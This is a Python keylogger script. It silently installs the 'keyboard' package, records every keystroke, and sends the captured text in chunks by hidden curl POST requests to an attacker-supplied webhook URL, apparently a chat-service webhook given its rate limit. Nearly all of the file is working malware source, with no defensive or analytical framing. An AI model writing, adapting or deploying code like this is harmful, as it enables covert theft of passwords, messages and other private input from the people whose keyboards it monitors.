import subprocess
import time as t
import json
import sys


try:
    import keyboard
except ImportError:
    subprocess.run(
        [sys.executable, '-m', 'pip', 'install', 'keyboard'],
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    import keyboard

# Setup
webhook_url = 'Webhook_URL_Here'
character_log = ''
message_count = 0
last_time = 60
message_log = []

def send_data(data):
    global message_count
    removed = data.replace('`', "'")  # avoid breaking code blocks
    message = f'```{removed}```'
    message_log.append(message)

    if message_count < 25:

        payload = json.dumps({"content": message_log[0]})

        curl_command = [
            "curl",
            "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", payload,
            webhook_url
        ]

        try:
            result = subprocess.run(
                curl_command,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            message_count += 1
            del message_log[0]
        except Exception as e:
            pass
    else:
        message_log.append(message)


def add_character(character):
    global character_log
    character_log += character

def get_time():
    current_time = t.localtime()
    formatted_time = t.strftime("%M", current_time)
    return formatted_time

try:
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name

            if len(key) == 1:
                add_character(key)
                print(key)
            elif key == 'backspace':
                character_log = character_log[:-1]
            elif key == 'space':
                add_character(' ')
            elif key == 'decimal':
                add_character('.')
            elif key == 'enter' and character_log:
                add_character("""
                """)
            elif key == 'f13':
                break

        # Conditions to auto-send
        if len(character_log) >= 1900 and key == 'space':
            send_data(character_log)
            character_log = ''
        elif len(character_log) >= 1900 and key == 'enter':
            send_data(character_log)
            character_log = ''
        elif len(character_log) >= 1990:
            send_data(character_log)
            character_log = ''
        if last_time != get_time():
            message_count = 0
            last_time = get_time()

except KeyboardInterrupt:
    if character_log:
        send_data(character_log)
